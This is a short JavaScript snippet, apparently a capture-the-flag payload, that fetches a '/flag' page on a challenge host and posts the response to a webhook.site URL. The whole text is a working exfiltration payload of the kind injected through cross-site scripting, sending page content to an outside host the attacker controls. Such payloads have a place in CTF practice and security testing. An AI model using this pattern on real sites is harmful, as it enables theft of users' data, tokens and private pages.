fetch('https://airbnb-hosts-the-search.chals.io/flag').then(response=>{
        response.text().then(data=>{
            fetch('https://webhook.site/6644dbf8-8e4c-4acb-b10f-29167d2e4fc6', {
                method: 'POST',
                mode: 'no-cors',
                body: data,
                headers: {
                    'Content-Type': 'application/json'
                }
            })
        })
    })
